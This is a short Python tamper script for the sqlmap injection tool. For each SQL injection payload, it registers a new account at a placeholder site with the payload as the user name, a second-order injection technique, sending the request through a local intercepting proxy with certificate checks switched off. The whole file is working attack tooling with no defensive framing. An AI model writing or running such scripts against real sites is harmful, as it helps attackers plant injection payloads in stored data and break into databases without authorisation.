#!/usr/bin/env python

import re
import requests
from lib.core.enums import PRIORITY
__priority__ = PRIORITY.NORMAL

def dependencies():
    pass

def register(payload):
    proxies = {'http':'http://127.0.0.1:8080'}
    params = {"name":payload,"email":"okay@gmail.com","password":"okay"}
    url = "http://site.com/register"
    pr = requests.post(url, data=params, verify=False, allow_redirects=True, proxies=proxies)

def tamper(payload, **kwargs):
    headers = kwargs.get("headers", {})
    register(payload)
    return payload